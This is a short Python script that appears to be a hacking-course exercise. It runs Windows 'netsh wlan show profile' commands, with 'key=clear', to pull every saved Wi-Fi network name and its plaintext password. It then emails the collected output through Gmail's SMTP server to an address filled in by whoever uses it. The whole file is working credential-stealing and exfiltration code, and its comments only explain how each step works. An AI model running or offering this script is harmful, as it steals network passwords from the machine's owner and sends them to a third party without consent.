#!usr/bin/env python

import subprocess,smtplib,re      #to execute system commands

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587) #instance of object SMTP is saved in server. gmail smtp server.
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()




command="netsh wlan show profile"
networks = subprocess.check_output(command, shell= True)  #Popen- executes and moves to the next process. doesn't wait for the command to be finish executing.
network_names_list=re.findall("(?:Profile\s*:\s)(.*)",networks) 
#findall functions searches for the regex combination throught the networks. and stores the output in the list.
#using regex to filter the desired outputs, just the netword names. "?:"- used before profile to not capture and store it in the network_names.
result=""
for network_name in network_names_list:
        command = "netsh wlan show profile " + network_name + " key=clear"              #command that retrieces the password the given access point.
        current_result = subprocess.check_output(command, shell= True)
        result= result+current_result
    
#print(result)
send_mail("","",result)
        #"emailaddress","password"